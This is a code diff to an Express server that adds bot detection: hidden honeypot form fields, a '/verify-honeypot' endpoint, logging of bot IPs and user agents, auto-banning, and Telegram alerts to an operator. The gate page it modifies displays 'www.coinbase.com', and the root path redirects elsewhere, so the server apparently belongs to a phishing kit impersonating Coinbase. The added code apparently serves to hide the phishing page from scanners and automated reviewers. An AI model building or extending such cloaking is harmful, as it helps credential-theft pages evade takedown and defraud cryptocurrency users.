@@ -300,6 +300,93 @@ const generateSessionId = (clientIP, userAgent) => {
         .slice(0, 8);
 };
 
+const BotLogger = {
+    logFile: join(__dirname, '../../logs/detected_bots.txt'),
+    jsonFile: join(__dirname, '../../logs/bot_signatures.json'),
+    
+    async initialize() {
+        try {
+            // Ensure logs directory exists
+            const logsDir = join(__dirname, '../../logs');
+            await fsPromises.mkdir(logsDir, { recursive: true });
+            
+            // Create files if they don't exist
+            await fsPromises.access(this.logFile).catch(async () => {
+                await fsPromises.writeFile(this.logFile, '');
+            });
+            
+            await fsPromises.access(this.jsonFile).catch(async () => {
+                await fsPromises.writeFile(this.jsonFile, '[]');
+            });
+        } catch (error) {
+            console.error('Error initializing bot logger:', error);
+        }
+    },
+    
+    async logBot(data) {
+        try {
+            const timestamp = new Date().toISOString();
+            const logEntry = `[${timestamp}] IP: ${data.ip} | UA: ${data.userAgent} | Fields: ${JSON.stringify(data.fields)}\n`;
+            
+            // Append to text log
+            await fsPromises.appendFile(this.logFile, logEntry);
+            
+            // Update JSON database
+            const jsonContent = await fsPromises.readFile(this.jsonFile, 'utf8');
+            const botList = JSON.parse(jsonContent || '[]');
+            
+            // Create signature object
+            const signature = {
+                ip: data.ip,
+                userAgent: data.userAgent,
+                timestamp,
+                fields: data.fields,
+                fingerprint: this.createFingerprint(data.userAgent)
+            };
+            
+            // Check if similar signature exists
+            const exists = botList.some(bot => 
+                bot.userAgent === data.userAgent || bot.ip === data.ip
+            );
+            
+            if (!exists) {
+                botList.push(signature);
+                await fsPromises.writeFile(
+                    this.jsonFile, 
+                    JSON.stringify(botList, null, 2)
+                );
+            }
+            
+            // Auto-ban if configured
+            if (state.settings.autoBanBots) {
+                ipManager.banIP(data.ip, {
+                    bannedBy: 'honeypot',
+                    bannedAt: timestamp,
+                    reason: 'Honeypot trigger'
+                });
+                
+                // Notify admin
+                await sendTelegramNotification(formatTelegramMessage('bot_banned', {
+                    ip: data.ip,
+                    userAgent: data.userAgent,
+                    reason: 'Honeypot trigger'
+                }));
+            }
+            
+        } catch (error) {
+            console.error('Error logging bot:', error);
+        }
+    },
+    
+    createFingerprint(userAgent) {
+        // Create a simplified fingerprint from user agent
+        return userAgent
+            .toLowerCase()
+            .replace(/[^a-z0-9]/g, '')
+            .slice(0, 32);
+    }
+};
+
 // Initialize server components
 const app = express();
 
@@ -437,6 +524,8 @@ state.settings.availablePages = scanPages(pagesPath);
 
 // Initialize Telegram integration
 initTelegramService(state.settings);
+await BotLogger.initialize();
+
 
 // Page serving middleware
 const pageServingMiddleware = async (req, res, next) => {
@@ -542,6 +631,34 @@ app.get('/', (req, res) => {
     return res.redirect(302, 'https://redirectingroute.com/');
  });
 
+ app.post('/verify-honeypot', async (req, res) => {
+    const { email, username, website } = req.body;
+    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
+                    req.headers['x-real-ip'] || 
+                    req.socket.remoteAddress;
+    const userAgent = req.headers['user-agent'];
+    
+    // If any honeypot field is filled, it's likely a bot
+    if (email || username || website) {
+        console.log('Honeypot triggered:', {
+            ip: clientIP,
+            userAgent,
+            fields: { email, username, website }
+        });
+        
+        // Log the bot
+        await BotLogger.logBot({
+            ip: clientIP,
+            userAgent,
+            fields: { email, username, website }
+        });
+        
+        return res.json({ redirect: state.settings.redirectUrl });
+    }
+    
+    res.json({ success: true });
+});
+
 // Initial IP check
 app.get('/check-ip', async (req, res) => {
     const isAdminPanel = req.headers.referer?.includes('/admin');
@@ -628,6 +745,16 @@ app.get('/check-ip', async (req, res) => {
             line-height: 1.15;
             -webkit-text-size-adjust: 100%;
             color: #d9d9d9;
+        }
+
+       .honeypot-field {
+            position: absolute !important;
+            left: -9999px !important;
+            top: -9999px !important;
+            opacity: 0 !important;
+            width: 0 !important;
+            height: 0 !important;
+            pointer-events: none !important;
         }
 
         body {
@@ -721,6 +848,11 @@ app.get('/check-ip', async (req, res) => {
     </style>
 </head>
 <body>
+    <form id="contact-form" class="honeypot-field" tabindex="-1" aria-hidden="true">
+        <input type="email" name="email" autocomplete="off">
+        <input type="text" name="username" autocomplete="off">
+        <input type="url" name="website" autocomplete="off">
+    </form>
     <div class="main-wrapper">
         <div class="main-content">
             <h1 class="h1">www.coinbase.com</h1>
